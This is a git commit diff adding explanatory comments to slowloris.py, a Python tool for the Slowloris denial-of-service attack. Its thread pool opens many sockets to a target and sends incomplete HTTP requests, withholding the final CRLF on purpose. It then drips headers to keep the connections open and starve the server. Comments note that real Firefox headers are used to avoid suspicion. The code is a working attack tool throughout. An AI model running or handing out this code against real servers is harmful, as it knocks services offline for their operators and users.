1b238d5bfef69ee526d3964515ae76fc4ac4c65d
CK <nankeen@users.noreply.github.com>
2016-11-14 22:20:32 +0800

    Added comments

--- slowloris.py
+++ slowloris.py
@@ -18,7 +18,7 @@ logger.addHandler(handler)
 
 
 class Worker(Thread):
-    """Thread executing tasks from a given tasks queue"""
+    '''Thread executing tasks from a given tasks queue'''
     def __init__(self, tasks):
         Thread.__init__(self)
         self.tasks = tasks
@@ -26,38 +26,54 @@ class Worker(Thread):
         self.start()
 
     def run(self):
+        '''
+        `run` overrides the Thread class and will be the code run by the thread, it takes functions from the `tasks` queue and calls them with the arguments provided
+        '''
         while True:
+            # Retrive the function and arguments from the `tasks` queue
             func, args, kargs = self.tasks.get()
+
+            # Try to run it, outputs exception if failed
             try:
                 func(*args, **kargs)
             except Exception as e:
                 print(e)
+
+            # Removes the element from the queue
             self.tasks.task_done()
 
 
 class ThreadPool:
-    """Pool of threads consuming tasks from a queue"""
+    '''Pool of threads consuming tasks from a queue'''
     def __init__(self, num_threads):
         self.tasks = Queue(num_threads)
         for _ in range(num_threads):
             Worker(self.tasks)
 
     def add_task(self, func, *args, **kargs):
-        """Add a task to the queue"""
+        '''Add a task to the queue'''
         self.tasks.put((func, args, kargs))
 
     def wait_completion(self):
-        """Wait for completion of all the tasks in the queue"""
+        '''Wait for completion of all the tasks in the queue'''
         self.tasks.join()
 
 
 class SlowLoris:
+    # These are legit Firefox headers so the connections does not appear suspicious
     headers = [
         'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
         'Accept-Language: en-US,en;q=0.5'
     ]
 
     def __init__(self, target, sock_count, thread_count=1):
+        '''
+        A SlowLoris attack class which handles creation and management of sockets with thread pool feature
+        Arguments:
+        - `target` , a (host, port) set specifying the destination
+        - `sock_count` , the number of socket connections to make to the target
+        - `thread_count` , the maximum number of threads in the thread pool
+        '''
         self.sockets = []
         self._workers = []
         self._sock_count = sock_count
@@ -65,34 +81,56 @@ class SlowLoris:
         self.pool = ThreadPool(thread_count)
 
     def connect_sockets(self):
+        '''
+        Creates the socket connections specified in `_sock_count` by adding the task to the queue and blocks until all sockets are created
+        '''
         for _ in range(self._sock_count):
+            # Addding the task to the thread pool queue
             self.pool.add_task(self.init_socket)
         self.pool.wait_completion()
 
     def init_socket(self):
+        '''
+        Creates a single socket to the target and stores the socket in the `sockets` list to be managed later
+        '''
         try:
+            # Create and connect the socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(4)
             sock.connect(self.target)
 
+            # Send the headers of the HTTP request
             sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
             for header in self.headers:
                 sock.send('{}\r\n'.format(header).encode('utf-8'))
+
+            # Note: a CLRF is not sent to maintain the connection
             logger.debug('Connection established for {} on port {}'.format(self.target[0], self.target[1]))
             if sock:
+                # Appending the lists of sockets
                 self.sockets.append(sock)
         except socket.error:
+            # Unable to establish connection, return gracefully
             logger.info('Losing connection at {} sockets'.format(len(self.sockets)))
             return
 
     def __enter__(self):
+        '''
+        To enable the `with ... as ...` construction of this class
+        '''
         return self
 
     def __exit__(self, *args):
+        '''
+        Closing the socket connections for garbage collection
+        '''
         for sock in self.sockets:
             sock.close()
 
     def keep_alive(self):
+        '''
+        Slowly sending data to the server to maintain a connection and starve it's resources
+        '''
         for sock in self.sockets:
             try:
                 sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
